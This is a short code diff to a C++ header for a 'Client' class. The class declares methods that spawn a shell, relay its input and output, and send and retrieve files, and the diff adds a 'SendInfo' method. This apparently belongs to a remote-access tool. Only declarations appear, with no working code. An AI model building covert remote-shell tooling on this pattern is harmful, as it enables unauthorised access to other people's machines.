@@ -31,8 +31,9 @@ class Client: public Downloader{
 		void SpawnShell(const std::string);
 		void threadReadShell(HANDLE);
 		void threadWriteShell(HANDLE);
-		int SendError(const char*);
+	    int SendError(const char*);
 		bool SendFile(const std::string);
+		bool SendInfo();
 		void RetrieveFile(u64, c_char, const std::string);
 };
 
